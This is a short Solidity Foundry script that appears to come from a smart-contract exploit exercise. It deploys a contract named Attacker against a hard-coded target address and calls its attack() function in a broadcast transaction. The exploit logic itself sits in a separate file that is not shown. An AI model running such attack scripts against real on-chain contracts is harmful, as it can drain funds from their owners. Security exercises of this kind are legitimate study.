// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "src/Attacker.sol";

contract AttackerScript is Script {

    function run() public {
        vm.startBroadcast();

        Attacker attacker = new Attacker(0x27ee8cB2b0fce2596A991C38A4Ba5E598a26a8cA);
        attacker.attack();
        
        vm.stopBroadcast();
    }
}
